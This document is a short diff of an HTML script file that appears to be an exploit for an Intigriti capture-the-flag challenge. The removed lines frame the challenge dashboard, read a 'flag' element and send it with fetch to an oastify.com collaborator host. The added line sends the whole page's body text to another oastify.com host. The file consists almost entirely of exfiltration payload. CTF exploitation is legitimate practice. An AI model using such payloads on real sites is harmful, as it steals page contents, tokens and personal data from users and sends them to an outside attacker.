@@ -1,27 +1,3 @@
-<!DOCTYPE html>
-<html>
-<body>
-
-<iframe id="frame" src="https://challenge-0126.intigriti.io/dashboard.html"></iframe>
-
 <script>
-setTimeout(() => {
-
-  try {
-
-    let frame = document.getElementById("frame");
-    let flagText = frame.contentDocument.getElementById("flagText").innerText;
-
-    fetch("https://547y6edhq2nj6rs5yo7bnpx3yu4lscj08.oastify.com/?flag=" + encodeURIComponent(flagText));
-
-  } catch(e) {
-
-    fetch("https://547y6edhq2nj6rs5yo7bnpx3yu4lscj08.oastify.com/?error=" + e);
-
-  }
-
-}, 5000);
+fetch("https://aes3gjnm07xogw2a8thgxu788zeq2hu5j.oastify.com?flag=" + document.body.innerText)
 </script>
-
-</body>
-</html>
